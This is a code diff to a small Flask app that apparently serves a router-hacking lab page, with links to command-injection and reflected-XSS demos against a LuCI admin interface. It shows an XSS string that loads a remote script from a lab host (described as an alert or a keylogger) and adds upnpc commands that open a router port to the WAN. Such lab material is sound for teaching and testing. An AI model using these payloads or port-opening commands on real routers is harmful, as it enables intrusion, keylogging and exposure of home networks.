@@ -12,6 +12,7 @@ def hello_world():
             <br><a href=/command_injection_ls>ls via command injection</a></>\
             <br></>\
             <br>The XSS attack string to call a remote payload should look like this: <xmp><script src=//172&#46;30&#46;254&#46;2/s></script>.</xmp> That points to /s which is the simple alert(1) script. For the keylogger, you should point to <a href=/t>/t</a>, so it would look like this: <xmp><script src=//172&#46;30&#46;254&#46;2/s></script></xmp></>\
+            <br>To check for an IGD use "upnpc -m <iface> -s" and to open port 80 to the WAN use "upnpc -m <iface> -a <ip> <port> <external_port> (TCP|UDP)." For our purposes that\'ll look like: upnpc -m br0 172.30.254.1 80 80 TCP</br>\
             '
 
 
@@ -84,7 +85,6 @@ def cmd_inject():
 @app.route('/reflected_xss')
 def xss():
     return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=whatever/admin/system/packages?query=<script>alert(1)</script>'
-
 
 if __name__ == '__main__':
     #app.run(port=5000)
